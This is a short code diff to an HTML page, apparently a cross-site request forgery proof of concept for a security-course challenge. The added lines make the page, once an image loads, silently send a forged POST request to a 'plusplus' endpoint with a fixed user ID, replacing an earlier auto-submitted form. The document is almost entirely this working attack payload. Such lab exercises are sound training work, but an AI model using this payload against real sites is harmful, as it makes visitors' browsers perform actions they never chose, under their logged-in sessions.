@@ -14,7 +14,8 @@
 	</form>
 	<script>
 		myImage.onload = function(){
-  			document.forms['csrfForm'].submit();
+  			;(new XMLHttpRequest()).open("POST", "https://security.codepath.com//user/csrfchallengetwo/plusplus", true).send("userId=183cb80b98c5db7e87c6a738f46b631ca1432ef1");
+  			//document.forms['csrfForm'].submit();
 		}
 	</script>
 </body>
